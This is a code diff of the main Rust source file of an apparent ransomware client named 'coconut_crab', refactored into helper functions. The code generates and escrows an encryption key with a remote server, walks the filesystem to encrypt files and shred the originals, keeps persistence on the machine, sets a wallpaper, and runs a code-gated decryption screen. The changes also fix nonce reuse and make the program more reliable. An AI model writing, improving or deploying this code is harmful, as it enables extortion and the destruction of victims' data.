@@ -3,11 +3,12 @@
     windows_subsystem = "windows"
 )]
 #![allow(clippy::similar_names)]
+#![allow(clippy::too_many_arguments, clippy::too_many_lines)]
 
 use hex::encode;
 use log::{debug, error, info, warn};
 use std::{
-    env,
+    path::{Path, PathBuf},
     sync::{
         Arc,
         atomic::{AtomicU64, Ordering},
@@ -16,16 +17,18 @@ use std::{
 };
 use zeroize::Zeroize;
 
-use coconut_crab_lib::file::get_exe_path_dir;
+use coconut_crab_lib::{file::get_exe_path_dir, web::codes::RECOVERY_REQUEST_CODE};
 
 mod persist;
 use persist::{start_persist, stop_persist};
 
 mod crypto;
-use crypto::{decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, record};
+use crypto::{
+    decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, nonce_from_counter, record,
+};
 
 mod walker;
-use walker::{random_walk, walk, walk_with_exts};
+use walker::{random_walk_with_exts, walk_with_exts};
 
 mod comm;
 use comm::{
@@ -34,13 +37,13 @@ use comm::{
 };
 
 mod status;
-use status::export_status_csv;
+use status::{Status, export_status_csv};
 
 mod shredder;
 use shredder::shred;
 
 mod client;
-use client::{get_thread_nums, initialize_client};
+use client::{ThreadNums, get_thread_nums, initialize_client};
 
 mod img;
 use img::set_icon_wallpaper;
@@ -91,83 +94,21 @@ fn main() {
     let num_threads = get_thread_nums();
 
     let mut sym_key = [0u8; 32];
-    let counter = AtomicU64::new(0);
+    let counter = if status.encryption_started {
+        AtomicU64::new(u64::MAX / 2) // Start at very high value on restart to avoid nonce reuse
+    } else {
+        AtomicU64::new(0)
+    };
 
     if !status.encryption_complete {
-        debug!("Encryption not previously completed");
-
-        debug!("Starting key operations");
-        if status.encryption_started {
-            debug!("Encryption previously started");
-
-            debug!("Starting key retrieval");
-            sym_key = if let Some(key) = get_sym_key(
-                server_fqdn,
-                config::SERVER_PORT,
-                &status,
-                &lc!("0000-0000-0000-0000"),
-                preshared_secret,
-                config::HTTPS,
-                config::VERIFY_SERVER,
-            ) {
-                key
-            } else {
-                debug!("Unable to retrieve key. Marking encryption complete.");
-                status.encryption_complete = true;
-                [0u8; 32]
-            };
-        } else {
-            debug!("Encryption not previously started");
-            generate_sym_key(&mut sym_key);
-
-            let asym_pub_key = download_asym_pub_key(
-                server_fqdn,
-                config::SERVER_PORT,
-                config::HTTPS,
-                config::VERIFY_SERVER,
-            );
-            debug!("Got asymmetric public key: {asym_pub_key:?}");
-
-            if config::SAVE_PUBLIC_KEY_TO_DISK {
-                debug!("Saving asymmetric public key to disk");
-                write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
-            }
-
-            status.asymmetrically_encrypted_symmetric_key =
-                encrypt_sym_key(&asym_pub_key, &sym_key);
-            debug!(
-                "Encrypted symmetric key: {}",
-                status.asymmetrically_encrypted_symmetric_key
-            );
-
-            upload_sym_key(
-                server_fqdn,
-                config::SERVER_PORT,
-                &status,
-                preshared_secret,
-                config::HTTPS,
-                config::VERIFY_SERVER,
-            );
-            debug!("Uploaded encrypted symmetric key");
-
-            let nonce = counter.fetch_add(1, Ordering::Relaxed);
-            debug!("Nonce value after increment: {nonce}");
-
-            let mut full_nonce_bytes: [u8; 12] = [0u8; 12];
-            full_nonce_bytes[0..8].copy_from_slice(&nonce.to_le_bytes());
-            debug!("Nonce value after padding: {full_nonce_bytes:?}");
-
-            status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
-            status.symmetrically_encrypted_id =
-                encrypt_string(&status.id, &sym_key, &full_nonce_bytes);
-            debug!(
-                "Added symmetrically encrypted id ({}) and nonce ({}) to status",
-                status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce
-            );
-        }
-
-        export_status_csv(&exe_path_dir, &status);
-        debug!("Updated status CSV");
+        setup_encryption_keys(
+            &mut status,
+            &mut sym_key,
+            &counter,
+            &exe_path_dir,
+            server_fqdn,
+            preshared_secret,
+        );
     }
 
     let sym_key_arc = Arc::new(sym_key);
@@ -179,199 +120,22 @@ fn main() {
     let exe_path_dir_arc = Arc::new(exe_path_dir);
 
     if !status.encryption_complete {
-        debug!("Starting encryption process");
-
-        status.encryption_started = true;
-        export_status_csv(exe_path_dir_arc.as_ref(), &status);
-        debug!("Updated status CSV");
-
-        let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
-        let (channel_a_sender, channel_a_receiver) =
-            crossbeam_channel::bounded(cap(num_threads.encrypt_threads));
-        let mut thread_handles = Vec::new();
-
-        if config::RANDOM_ORDER {
-            for _ in 0..num_threads.walk_threads {
-                thread_handles.push(random_walk(channel_a_sender.clone()));
-                debug!("Spawned random walk thread");
-            }
-        } else {
-            for _ in 0..num_threads.walk_threads {
-                thread_handles.push(walk(channel_a_sender.clone()));
-                debug!("Spawned walk thread");
-            }
-        }
-        drop(channel_a_sender);
-        debug!(
-            "All walk threads spawned. {} total threads spawned.",
-            thread_handles.len()
-        );
-
-        let (channel_c_sender, channel_c_receiver) =
-            crossbeam_channel::bounded(cap(num_threads.shred_threads));
-
-        if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
-            debug!("Canary mode enabled");
-
-            let (channel_b_sender, channel_b_receiver) =
-                crossbeam_channel::bounded(cap(num_threads.encrypt_threads_canary));
-
-            for thread_num in 0..num_threads.canary_threads {
-                thread_handles.push(filter_canary(
-                    channel_a_receiver.clone(),
-                    channel_b_sender.clone(),
-                ));
-                debug!("Spawned canary filter thread {thread_num}");
-            }
-            drop(channel_a_receiver);
-            drop(channel_b_sender);
-            debug!(
-                "All canary threads spawned. {} total threads spawned.",
-                thread_handles.len()
-            );
-
-            if config::ANALYZE_MODE {
-                debug!("Analyze mode enabled");
-                thread_handles.push(record(channel_b_receiver.clone(), exe_path_dir_arc.clone()));
-                debug!("Spawned analysis thread");
-                drop(channel_b_receiver);
-                debug!(
-                    "All analysis threads spawned. {} total threads spawned.",
-                    thread_handles.len()
-                );
-                drop(channel_c_sender);
-                drop(channel_c_receiver);
-            } else {
-                for thread_num in 0..num_threads.encrypt_threads_canary {
-                    thread_handles.push(encrypt(
-                        channel_b_receiver.clone(),
-                        channel_c_sender.clone(),
-                        sym_key_arc.clone(),
-                        counter_arc.clone(),
-                        encrypted_extension_arc.clone(),
-                        wait_time_arc.clone(),
-                        jitter_time_arc.clone(),
-                    ));
-                    debug!("Spawned encryption thread {thread_num}");
-                }
-                debug!(
-                    "All encryption threads spawned. {} total threads spawned.",
-                    thread_handles.len()
-                );
-                drop(channel_b_receiver);
-                drop(channel_c_sender);
-
-                for thread_num in 0..num_threads.shred_threads {
-                    thread_handles.push(shred(channel_c_receiver.clone()));
-                    debug!("Spawned shred thread {thread_num}");
-                }
-                drop(channel_c_receiver);
-                debug!(
-                    "All shred threads spawned. {} total threads spawned.",
-                    thread_handles.len()
-                );
-            }
-        } else if config::ANALYZE_MODE {
-            debug!("Analyze mode enabled");
-            thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
-            debug!("Spawned analysis thread");
-            debug!(
-                "All analysis threads spawned. {} total threads spawned.",
-                thread_handles.len()
-            );
-            drop(channel_a_receiver);
-            drop(channel_c_sender);
-            drop(channel_c_receiver);
-        } else {
-            for thread_num in 0..num_threads.encrypt_threads {
-                thread_handles.push(encrypt(
-                    channel_a_receiver.clone(),
-                    channel_c_sender.clone(),
-                    sym_key_arc.clone(),
-                    counter_arc.clone(),
-                    encrypted_extension_arc.clone(),
-                    wait_time_arc.clone(),
-                    jitter_time_arc.clone(),
-                ));
-                debug!("Spawned encryption thread {thread_num}");
-            }
-            debug!(
-                "All encryption threads spawned. {} total threads spawned.",
-                thread_handles.len()
-            );
-            drop(channel_a_receiver);
-            drop(channel_c_sender);
-
-            for thread_num in 0..num_threads.shred_threads {
-                thread_handles.push(shred(channel_c_receiver.clone()));
-                debug!("Spawned shred thread {thread_num}");
-            }
-            drop(channel_c_receiver);
-            debug!(
-                "All shred threads spawned. {} total threads spawned.",
-                thread_handles.len()
-            );
-        }
-
-        for handle in thread_handles {
-            debug!("Joining thread: {handle:?}");
-            handle.join().expect("Thread panicked");
-        }
-
-        status.encryption_complete = true;
-        debug!("Encryption complete");
-        export_status_csv(exe_path_dir_arc.as_ref(), &status);
-        debug!("Updated status CSV");
-
-        announce_completion(
+        run_encryption_pipeline(
+            &mut status,
+            &sym_key_arc,
+            &counter_arc,
+            &encrypted_extension_arc,
+            &wait_time_arc,
+            &jitter_time_arc,
+            &exe_path_dir_arc,
+            &num_threads,
             server_fqdn,
-            config::SERVER_PORT,
-            &status,
             preshared_secret,
-            config::HTTPS,
-            config::VERIFY_SERVER,
         );
-        debug!("Announced completion");
     }
 
     sym_key.zeroize();
     debug!("Cleared symmetric key from memory");
-
-    let decryption_operation = move |sym_key: [u8; 32]| {
-        let (s3, r3) =
-            crossbeam_channel::bounded(std::cmp::max(num_threads.decrypt_threads * 2, 64));
-        let mut thread_handles = Vec::new();
-
-        for _ in 0..num_threads.walk_threads {
-            debug!("Spawning walk thread for decryption");
-            thread_handles.push(walk_with_exts(
-                s3.clone(),
-                Some(vec![encrypted_extension.clone()]),
-                None,
-            ));
-        }
-        drop(s3);
-        debug!(
-            "All walk threads spawned. {} total threads spawned.",
-            thread_handles.len()
-        );
-
-        let sym_key_arc = Arc::new(sym_key);
-        for thread_num in 0..num_threads.decrypt_threads {
-            thread_handles.push(decrypt(r3.clone(), sym_key_arc.clone()));
-            debug!("Spawned decryption thread {thread_num}");
-        }
-        drop(r3);
-        debug!(
-            "All decryption threads spawned. {} total threads spawned.",
-            thread_handles.len()
-        );
-
-        for handle in thread_handles {
-            debug!("Joining thread: {handle:?}");
-            handle.join().expect("Thread panicked");
-        }
-    };
 
     if config::SET_WALLPAPER {
         set_icon_wallpaper();
@@ -381,83 +145,16 @@ fn main() {
     set_window_icon(&ui);
     callback_handler_init(&ui);
 
-    let ui_handle = ui.as_weak();
-    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);
-    let decryption_handler = move || {
-        debug!("Initializing decryption handler thread");
-        loop {
-            let code: Arc<String> = match r_decrypt.recv() {
-                Ok(key) => {
-                    debug!("Received code over channel: {key:?}");
-                    key
-                }
-                Err(error) => {
-                    warn!("Error receiving code over channel: {error}");
-                    return;
-                }
-            };
-
-            debug!("Requesting symmetric key using user provided code");
-            let Some(sym_key) = get_sym_key(
-                server_fqdn,
-                config::SERVER_PORT,
-                &status,
-                &code,
-                preshared_secret,
-                config::HTTPS,
-                config::VERIFY_SERVER,
-            ) else {
-                if ui_handle
-                    .upgrade_in_event_loop(move |handle| {
-                        handle.set_status_text("Code failed verification".into());
-                    })
-                    .is_err()
-                {
-                    error!("Failed to upgrade UI handle");
-                }
-                if ui_handle
-                    .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-                    .is_err()
-                {
-                    error!("Failed to upgrade UI handle");
-                }
-                return;
-            };
-
-            info!("Starting decryption");
-            if ui_handle
-                .upgrade_in_event_loop(move |handle| {
-                    handle.set_status_text("Code successfully verified. Decrypting...".into());
-                })
-                .is_err()
-            {
-                error!("Failed to upgrade UI handle");
-            }
-
-            decryption_operation(sym_key);
-
-            info!("Decryption complete");
-            if ui_handle
-                .upgrade_in_event_loop(move |handle| {
-                    handle.set_status_text("Decryption complete".into());
-                })
-                .is_err()
-            {
-                error!("Failed to upgrade UI handle");
-            }
-            if ui_handle
-                .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-                .is_err()
-            {
-                error!("Failed to upgrade UI handle");
-            }
-
-            if config::PERSIST {
-                debug!("Ending persistence");
-                stop_persist();
-            }
-        }
-    };
+    let s_decrypt = spawn_decryption_handler(
+        &ui,
+        &status,
+        server_fqdn,
+        preshared_secret,
+        &encrypted_extension,
+        num_threads.walk_threads,
+        num_threads.decrypt_threads,
+        config::PERSIST,
+    );
 
     let ui_handle = ui.as_weak();
     ui.on_try_decrypt(move || {
@@ -469,12 +166,380 @@ fn main() {
         ui.set_status_text("Verifying code...".into());
         ui.set_status_progress(true);
 
-        thread::spawn(decryption_handler.clone());
-
         s_decrypt
             .send(Arc::new(code))
             .expect("Failed to send code to decryption handler thread");
     });
 
     ui.run().expect("Failed to run Slint UI");
+}
+
+fn setup_encryption_keys(
+    status: &mut Status,
+    sym_key: &mut [u8; 32],
+    counter: &AtomicU64,
+    exe_path_dir: &Path,
+    server_fqdn: &str,
+    preshared_secret: &str,
+) {
+    debug!("Encryption not previously completed");
+
+    debug!("Starting key operations");
+    if status.encryption_started {
+        debug!("Encryption previously started");
+
+        debug!("Starting key retrieval");
+        *sym_key = if let Some(key) = get_sym_key(
+            server_fqdn,
+            config::SERVER_PORT,
+            status,
+            RECOVERY_REQUEST_CODE,
+            preshared_secret,
+            config::HTTPS,
+            config::VERIFY_SERVER,
+        ) {
+            key
+        } else {
+            debug!("Unable to retrieve key. Marking encryption complete.");
+            status.encryption_complete = true;
+            [0u8; 32]
+        };
+    } else {
+        debug!("Encryption not previously started");
+        generate_sym_key(sym_key);
+
+        let Some(asym_pub_key) = download_asym_pub_key(
+            server_fqdn,
+            config::SERVER_PORT,
+            config::HTTPS,
+            config::VERIFY_SERVER,
+        ) else {
+            error!("Unable to download asymmetric public key; marking encryption complete");
+            status.encryption_complete = true;
+            *sym_key = [0u8; 32];
+            export_status_csv(exe_path_dir, status);
+            return;
+        };
+        debug!("Got asymmetric public key: {asym_pub_key:?}");
+
+        if config::SAVE_PUBLIC_KEY_TO_DISK {
+            debug!("Saving asymmetric public key to disk");
+            write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
+        }
+
+        status.asymmetrically_encrypted_symmetric_key = encrypt_sym_key(&asym_pub_key, sym_key);
+        debug!(
+            "Encrypted symmetric key: {}",
+            status.asymmetrically_encrypted_symmetric_key
+        );
+
+        upload_sym_key(
+            server_fqdn,
+            config::SERVER_PORT,
+            status,
+            preshared_secret,
+            config::HTTPS,
+            config::VERIFY_SERVER,
+        )
+        .expect("Failed to upload symmetric key");
+        debug!("Uploaded encrypted symmetric key");
+
+        let nonce = counter.fetch_add(1, Ordering::Relaxed);
+        debug!("Nonce value after increment: {nonce}");
+
+        let full_nonce_bytes = nonce_from_counter(nonce);
+        debug!("Nonce value after padding: {full_nonce_bytes:?}");
+
+        status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
+        status.symmetrically_encrypted_id = encrypt_string(&status.id, sym_key, &full_nonce_bytes);
+        debug!(
+            "Added symmetrically encrypted id ({}) and nonce ({}) to status",
+            status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce
+        );
+    }
+
+    export_status_csv(exe_path_dir, status);
+    debug!("Updated status CSV");
+}
+
+fn run_encryption_pipeline(
+    status: &mut Status,
+    sym_key: &Arc<[u8; 32]>,
+    counter: &Arc<AtomicU64>,
+    encrypted_extension: &Arc<String>,
+    wait_time: &Arc<u32>,
+    jitter_time: &Arc<u32>,
+    exe_path_dir: &Arc<PathBuf>,
+    num_threads: &ThreadNums,
+    server_fqdn: &str,
+    preshared_secret: &str,
+) {
+    debug!("Starting encryption process");
+
+    status.encryption_started = true;
+    export_status_csv(exe_path_dir.as_ref(), status);
+    debug!("Updated status CSV");
+
+    let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
+    let (channel_a_sender, channel_a_receiver) =
+        crossbeam_channel::bounded(cap(num_threads.encrypt_threads));
+    let mut thread_handles = Vec::new();
+
+    if config::RANDOM_ORDER {
+        thread_handles.push(random_walk_with_exts(
+            channel_a_sender.clone(),
+            None,
+            None,
+            num_threads.walk_threads,
+        ));
+        debug!(
+            "Spawned random walk coordinator with {} zlob workers",
+            num_threads.walk_threads
+        );
+    } else {
+        thread_handles.push(walk_with_exts(
+            channel_a_sender.clone(),
+            None,
+            None,
+            num_threads.walk_threads,
+        ));
+        debug!(
+            "Spawned walk coordinator with {} zlob workers",
+            num_threads.walk_threads
+        );
+    }
+    drop(channel_a_sender);
+    debug!(
+        "All walk threads spawned. {} total threads spawned.",
+        thread_handles.len()
+    );
+
+    if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
+        debug!("Canary mode enabled");
+
+        let (channel_b_sender, channel_b_receiver) =
+            crossbeam_channel::bounded(cap(num_threads.encrypt_threads_canary));
+
+        for _ in 0..num_threads.canary_threads {
+            thread_handles.push(filter_canary(
+                channel_a_receiver.clone(),
+                channel_b_sender.clone(),
+            ));
+        }
+        drop(channel_a_receiver);
+        drop(channel_b_sender);
+        debug!(
+            "All canary threads spawned. {} total threads spawned.",
+            thread_handles.len()
+        );
+
+        if config::ANALYZE_MODE {
+            debug!("Analyze mode enabled");
+            thread_handles.push(record(channel_b_receiver.clone(), Arc::clone(exe_path_dir)));
+            drop(channel_b_receiver);
+        } else {
+            let (channel_c_sender, channel_c_receiver) =
+                crossbeam_channel::bounded(cap(num_threads.shred_threads));
+            for _ in 0..num_threads.encrypt_threads_canary {
+                thread_handles.push(encrypt(
+                    channel_b_receiver.clone(),
+                    channel_c_sender.clone(),
+                    Arc::clone(sym_key),
+                    Arc::clone(counter),
+                    Arc::clone(encrypted_extension),
+                    Arc::clone(wait_time),
+                    Arc::clone(jitter_time),
+                ));
+            }
+            drop(channel_b_receiver);
+            drop(channel_c_sender);
+
+            for _ in 0..num_threads.shred_threads {
+                thread_handles.push(shred(channel_c_receiver.clone()));
+            }
+            drop(channel_c_receiver);
+        }
+    } else if config::ANALYZE_MODE {
+        debug!("Analyze mode enabled");
+        thread_handles.push(record(channel_a_receiver.clone(), Arc::clone(exe_path_dir)));
+        drop(channel_a_receiver);
+    } else {
+        let (channel_c_sender, channel_c_receiver) =
+            crossbeam_channel::bounded(cap(num_threads.shred_threads));
+        for _ in 0..num_threads.encrypt_threads {
+            thread_handles.push(encrypt(
+                channel_a_receiver.clone(),
+                channel_c_sender.clone(),
+                Arc::clone(sym_key),
+                Arc::clone(counter),
+                Arc::clone(encrypted_extension),
+                Arc::clone(wait_time),
+                Arc::clone(jitter_time),
+            ));
+        }
+        drop(channel_a_receiver);
+        drop(channel_c_sender);
+
+        for _ in 0..num_threads.shred_threads {
+            thread_handles.push(shred(channel_c_receiver.clone()));
+        }
+        drop(channel_c_receiver);
+    }
+
+    for handle in thread_handles {
+        debug!("Joining thread: {handle:?}");
+        handle.join().expect("Thread panicked");
+    }
+
+    status.encryption_complete = true;
+    debug!("Encryption complete");
+    export_status_csv(exe_path_dir.as_ref(), status);
+    debug!("Updated status CSV");
+
+    if let Err(error) = announce_completion(
+        server_fqdn,
+        config::SERVER_PORT,
+        status,
+        preshared_secret,
+        config::HTTPS,
+        config::VERIFY_SERVER,
+    ) {
+        error!("Failed to announce completion: {error}");
+    } else {
+        debug!("Announced completion");
+    }
+}
+
+fn spawn_decryption_handler(
+    ui: &Main,
+    status: &Status,
+    server_fqdn: &str,
+    preshared_secret: &str,
+    encrypted_extension: &str,
+    walk_threads: usize,
+    decrypt_threads: usize,
+    persist: bool,
+) -> crossbeam_channel::Sender<Arc<String>> {
+    let ui_handle = ui.as_weak();
+    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);
+
+    let status = status.clone();
+    let server_fqdn = server_fqdn.to_string();
+    let preshared_secret = preshared_secret.to_string();
+    let encrypted_extension = encrypted_extension.to_string();
+
+    thread::spawn(move || {
+        debug!("Initializing decryption handler thread");
+
+        let code: Arc<String> = match r_decrypt.recv() {
+            Ok(key) => {
+                debug!("Received code over channel: {key:?}");
+                key
+            }
+            Err(error) => {
+                warn!("Error receiving code over channel: {error}");
+                return;
+            }
+        };
+
+        debug!("Requesting symmetric key using user provided code");
+        let Some(sym_key) = get_sym_key(
+            &server_fqdn,
+            config::SERVER_PORT,
+            &status,
+            &code,
+            &preshared_secret,
+            config::HTTPS,
+            config::VERIFY_SERVER,
+        ) else {
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| {
+                    handle.set_status_text("Code failed verification".into());
+                })
+                .is_err()
+            {
+                error!("Failed to upgrade UI handle");
+            }
+            if ui_handle
+                .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+                .is_err()
+            {
+                error!("Failed to upgrade UI handle");
+            }
+            return;
+        };
+
+        info!("Starting decryption");
+        if ui_handle
+            .upgrade_in_event_loop(move |handle| {
+                handle.set_status_text("Code successfully verified. Decrypting...".into());
+            })
+            .is_err()
+        {
+            error!("Failed to upgrade UI handle");
+        }
+
+        decrypt_files(sym_key, &encrypted_extension, walk_threads, decrypt_threads);
+
+        info!("Decryption complete");
+        if ui_handle
+            .upgrade_in_event_loop(move |handle| {
+                handle.set_status_text("Decryption complete".into());
+            })
+            .is_err()
+        {
+            error!("Failed to upgrade UI handle");
+        }
+        if ui_handle
+            .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+            .is_err()
+        {
+            error!("Failed to upgrade UI handle");
+        }
+
+        if persist {
+            debug!("Ending persistence");
+            stop_persist();
+        }
+    });
+
+    s_decrypt
+}
+
+fn decrypt_files(
+    sym_key: [u8; 32],
+    encrypted_extension: &str,
+    walk_threads: usize,
+    decrypt_threads: usize,
+) {
+    let (s3, r3) = crossbeam_channel::bounded(std::cmp::max(decrypt_threads * 2, 64));
+    let mut thread_handles = Vec::new();
+
+    debug!("Spawning walk coordinator for decryption with {walk_threads} zlob workers");
+    thread_handles.push(walk_with_exts(
+        s3.clone(),
+        Some(vec![encrypted_extension.to_string()]),
+        None,
+        walk_threads,
+    ));
+    drop(s3);
+    debug!(
+        "All walk threads spawned. {} total threads spawned.",
+        thread_handles.len()
+    );
+
+    let sym_key_arc = Arc::new(sym_key);
+    for _ in 0..decrypt_threads {
+        thread_handles.push(decrypt(r3.clone(), Arc::clone(&sym_key_arc)));
+    }
+    drop(r3);
+    debug!(
+        "All decryption threads spawned. {} total threads spawned.",
+        thread_handles.len()
+    );
+
+    for handle in thread_handles {
+        debug!("Joining thread: {handle:?}");
+        handle.join().expect("Thread panicked");
+    }
 }
